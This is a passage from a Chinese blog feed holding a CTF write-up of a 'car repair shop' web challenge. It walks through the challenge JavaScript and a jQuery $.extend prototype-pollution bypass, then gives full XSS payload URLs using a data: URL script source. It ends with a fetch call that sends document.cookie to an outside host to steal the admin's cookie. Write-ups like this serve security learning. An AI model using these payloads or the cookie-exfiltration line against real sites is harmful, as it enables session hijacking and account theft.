function">isStarted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">infobox</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`Well Done!`</span></span><span class="token punctuation">)</span>            <span class="token function">nextCar</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">infobox</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`powerOn fail!`</span></span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">//$('.chargeup')[0].play()</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">infobox</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`This car is a </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>model<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> in </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>color<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">. It looks very nice! But it seems to be broken ...`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">repair</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>urlParams<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'repair'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>urlParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'repair'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">light</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">infobox</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`You turn on the lights ... Nothing happens.`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">battery</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">infobox</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`Hmmm, the battery is almost empty ... Maybe i can repair this somehow.`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">ignition</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>key <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">infobox</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`Looks like the key got lost. No wonder the car is not starting ...`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>key <span class="token operator">==</span> <span class="token string">"ðŸ”‘"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">infobox</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`The car started!`</span></span><span class="token punctuation">)</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//util.js</span><span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token keyword">const</span> h <span class="token operator">=</span> location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">const</span> bugatti <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Car</span><span class="token punctuation">(</span><span class="token string">'Bugatti'</span><span class="token punctuation">,</span> <span class="token string">'T35'</span><span class="token punctuation">,</span> <span class="token string">'green'</span><span class="token punctuation">,</span> <span class="token string">'assets/images/bugatti.png'</span><span class="token punctuation">)</span><span class="token keyword">const</span> porsche <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Car</span><span class="token punctuation">(</span><span class="token string">'Porsche'</span><span class="token punctuation">,</span> <span class="token string">'911'</span><span class="token punctuation">,</span> <span class="token string">'yellow'</span><span class="token punctuation">,</span> <span class="token string">'assets/images/porsche.png'</span><span class="token punctuation">)</span><span class="token keyword">const</span> cars <span class="token operator">=</span> <span class="token punctuation">[</span>bugatti<span class="token punctuation">,</span> porsche<span class="token punctuation">]</span>porsche<span class="token punctuation">.</span>repair <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>bugatti<span class="token punctuation">.</span><span class="token function">isStarted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">infobox</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`Not so fast. Repair the other car first!`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span>porsche<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'9cdfb439c7876e703e307864c9167a15'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>urlParams<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'help'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">repairWithHelper</span><span class="token punctuation">(</span>urlParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'help'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">infobox</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`Repairing this is not that easy.`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>porsche<span class="token punctuation">.</span>ignition <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">infobox</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`Hmm ... WTF!`</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">[</span>car<span class="token punctuation">]</span> <span class="token operator">=</span> cars    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>car<span class="token punctuation">)</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.fa-power-off'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> car<span class="token punctuation">.</span><span class="token function">powerOn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.fa-car'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> car<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.fa-lightbulb-o'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> car<span class="token punctuation">.</span><span class="token function">light</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.fa-battery-quarter'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> car<span class="token punctuation">.</span><span class="token function">battery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.fa-key'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> car<span class="token punctuation">.</span><span class="token function">ignition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.fa-wrench'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> car<span class="token punctuation">.</span><span class="token function">repair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.fa-step-forward'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">nextCar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Bugatti'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">autoStart</span><span class="token punctuation">(</span>bugatti<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Porsche'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">autoStart</span><span class="token punctuation">(</span>porsche<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">const</span> nextCar <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    cars<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cars<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".image"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">,</span> cars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pic<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">const</span> autoStart <span class="token operator">=</span> <span class="token punctuation">(</span>car<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    car<span class="token punctuation">.</span><span class="token function">repair</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    car<span class="token punctuation">.</span><span class="token function">ignition</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    car<span class="token punctuation">.</span><span class="token function">powerOn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">const</span> repairWithHelper <span class="token operator">=</span> <span class="token punctuation">(</span>src<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"repairWithHelper"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//url = https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/</span>    <span class="token comment" spellcheck="true">/* who needs csp anyways !? */</span>    urlRegx <span class="token operator">=</span> <span class="token regex">/^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>urlRegx<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> s <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>src <span class="token operator">=</span> src        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'head'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> infobox <span class="token operator">=</span> <span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'pointer-events'</span><span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span> <span class="token string">'border'</span><span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.infobox'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">'infoAnimate'</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'animationend'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">removeClass</span><span class="token punctuation">(</span><span class="token string">'infoAnimate'</span><span class="token punctuation">)</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'pointer-events'</span><span class="token punctuation">:</span> <span class="token string">'all'</span><span class="token punctuation">,</span> <span class="token string">'border'</span><span class="token punctuation">:</span> <span class="token string">'solid 1px rgba(255, 255, 255, .25)'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h3 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h3><p>Jquery加载完dom之后，创建两个Car类的对象 <strong>bugatti</strong> 和 <strong>porsche</strong>，设h为锚点的值，判断是否包含<strong>bugatti</strong> 或 <strong>porsche</strong> 字符串，并对相应的对象执行autoStart函数。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token keyword">const</span> h <span class="token operator">=</span> location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">const</span> bugatti <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Car</span><span class="token punctuation">(</span><span class="token string">'Bugatti'</span><span class="token punctuation">,</span> <span class="token string">'T35'</span><span class="token punctuation">,</span> <span class="token string">'green'</span><span class="token punctuation">,</span> <span class="token string">'assets/images/bugatti.png'</span><span class="token punctuation">)</span><span class="token keyword">const</span> porsche <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Car</span><span class="token punctuation">(</span><span class="token string">'Porsche'</span><span class="token punctuation">,</span> <span class="token string">'911'</span><span class="token punctuation">,</span> <span class="token string">'yellow'</span><span class="token punctuation">,</span> <span class="token string">'assets/images/porsche.png'</span><span class="token punctuation">)</span><span class="token keyword">const</span> cars <span class="token operator">=</span> <span class="token punctuation">[</span>bugatti<span class="token punctuation">,</span> porsche<span class="token punctuation">]</span><span class="token operator">...</span><span class="token keyword">if</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Bugatti'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">autoStart</span><span class="token punctuation">(</span>bugatti<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Porsche'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">autoStart</span><span class="token punctuation">(</span>porsche<span class="token punctuation">)</span><span class="token operator">...</span><span class="token keyword">const</span> autoStart <span class="token operator">=</span> <span class="token punctuation">(</span>car<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    car<span class="token punctuation">.</span><span class="token function">repair</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    car<span class="token punctuation">.</span><span class="token function">ignition</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    car<span class="token punctuation">.</span><span class="token function">powerOn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>其中<strong>porsche</strong>类的ignition、repair会被改写。其中，在<code>porsche.repair()</code>方法中调用了<code>repairWithHelper</code>函数，这个关键函数存在xss</p><pre class=" language-javascript"><code class="language-javascript">porsche<span class="token punctuation">.</span>repair <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>bugatti<span class="token punctuation">.</span><span class="token function">isStarted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">infobox</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`Not so fast. Repair the other car first!`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span>porsche<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'9cdfb439c7876e703e307864c9167a15'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>urlParams<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'help'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">repairWithHelper</span><span class="token punctuation">(</span>urlParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'help'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">infobox</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`Repairing this is not that easy.`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>1、需要先repair第一辆名为”Bugatti”的车，改变bugatti.key = 🔑<br>2、使$.md5(porsche) == ‘9cdfb439c7876e703e307864c9167a15’<br>3、在repairWithHelper函数中存在script的src可控的情况，可以进行xss</p><h4 id="修改key值"><a href="#修改key值" class="headerlink" title="修改key值"></a>修改key值</h4><p>由于Car类内部<code>ignition()</code>方法调用了$extend，同时获取url参数<code>repair</code>用来合并Car类内属性，那么就可以通过传参覆盖key的值，因此构造<code>repair={&quot;key&quot;:&quot;%F0%9F%94%91&quot;}</code>就能轻松过第一个步骤</p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">repair</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>urlParams<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'repair'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>urlParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'repair'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>$.extend(true, object1 , object2)可以将object2合并到object1</p><h4 id="污染继承链"><a href="#污染继承链" class="headerlink" title="污染继承链"></a>污染继承链</h4><p>先将’9cdfb439c7876e703e307864c9167a15’解码得到lol</p><p>同时$.extend()方法也存在原型链污染问题，<a href="https://hackerone.com/reports/454365" target="_blank" rel="noopener">CVE-2019-11358</a>。( jquery version: 3.3.1)</p><p>可以将$.md5(porsche) == ​$.md5(“lol”)</p><pre class=" language-bash"><code class="language-bash">$.md5<span class="token punctuation">(</span>porsche<span class="token punctuation">)</span><span class="token string">"1441a7909c087dbbe7ce59881b9df8b9"</span>porsche.toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">"[object Object]"</span>$.md5<span class="token punctuation">(</span><span class="token string">'[object Object]'</span><span class="token punctuation">)</span><span class="token string">"1441a7909c087dbbe7ce59881b9df8b9"</span></code></pre><p>因为$.md5是对string类型的变量进行加密，那么传入的参数为对象时，就会经过类型的转换。</p><p>首先会对当前变量进行<code>toString()</code>，由于porsche这个对象没有<code>toString()</code>方法，按照Javascript的继承就会向上查找原原型 <code>__proto__</code> (Car对象)是否有 <code>toString()</code>，Car对象也没有 <code>toString()</code>，再向上查找到  (Object对象)，存在 <code>toString()</code>，调用并返回字符串：[object Object]</p><pre class=" language-bash"><code class="language-bash">bugatti.toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">"[object Object]"</span>porsche.toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">"[object Object]"</span><span class="token punctuation">[</span><span class="token string">"lol"</span><span class="token punctuation">]</span>.toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">"lol"</span>bugatti.__proto__.__proto__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"lol"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"lol"</span><span class="token punctuation">]</span>porsche.toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">"lol"</span></code></pre><p>Javascript的Array类型的toString方法会返回数组内容</p><p>因此，既然是将porsche对象进行$.md5的取值，那么我们污染bugatti的继承链中的Car类的<code>__proto__</code>，使其为数组[“lol”]，那么在porsche的toString()在向上寻找调用的时候也同样会返回”lol”，而不是到达顶端Object原型的toString()方法。</p><p>构造如下payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>repair<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"%F0%9F%94%91"</span><span class="token punctuation">,</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">"lol"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token shell-comment comment">#PorscheBugatti</span></code></pre><h4 id="repairWithHelper函数"><a href="#repairWithHelper函数" class="headerlink" title="repairWithHelper函数"></a>repairWithHelper函数</h4><p>help参数的引入script标签的src</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> repairWithHelper <span class="token operator">=</span> <span class="token punctuation">(</span>src<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* who needs csp anyways !? */</span>    urlRegx <span class="token operator">=</span> <span class="token operator">/</span><span class="token operator">^</span>w<span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>car<span class="token operator">-</span>repair<span class="token operator">-</span>shop<span class="token punctuation">.</span>fluxfingersforfuture<span class="token punctuation">.</span>fluxfingers<span class="token punctuation">.</span>net<span class="token regex">/[wd]+/</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token punctuation">.</span>js$<span class="token operator">/</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>urlRegx<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> s <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>src <span class="token operator">=</span> src        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'head'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>由于w{4,5}使得协议可控，用data://作为资源加载恶意的xss，</p><p>data-URL 符合格式 <code>data:[mime][;charset=][;base64],</code> 例:<code>data:image/png;base64,iVBORw0KG...</code></p><p>同时data不关心mime的类型，使得我们可以把白名单的host放到mime的位置。其实对于src这个属性来说，应该是都支持data资源的调用。最终payload如下:</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">?</span>help<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>car<span class="token operator">-</span>repair<span class="token operator">-</span>shop<span class="token punctuation">.</span>fluxfingersforfuture<span class="token punctuation">.</span>fluxfingers<span class="token punctuation">.</span>net<span class="token regex">/x/</span><span class="token punctuation">,</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//.js&amp;repair={"key":"🔑","__proto__":{"__proto__":["lol"]}}#BugattiPorsche</span></code></pre><pre class=" language-php"><code class="language-php">执行xss：<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token operator">%</span>22https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//raohh.cn:2333/%22%2Bdocument.cookie) 获得admin cookie</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>听见你的声音剧评1</title>
      <link href="/2019/11/07/ju-ping/ting-jian-ni-de-sheng-yin-1/"/>
      <url>/2019/11/07/ju-ping/ting-jian-ni-de-sheng-yin-1/</url>
      
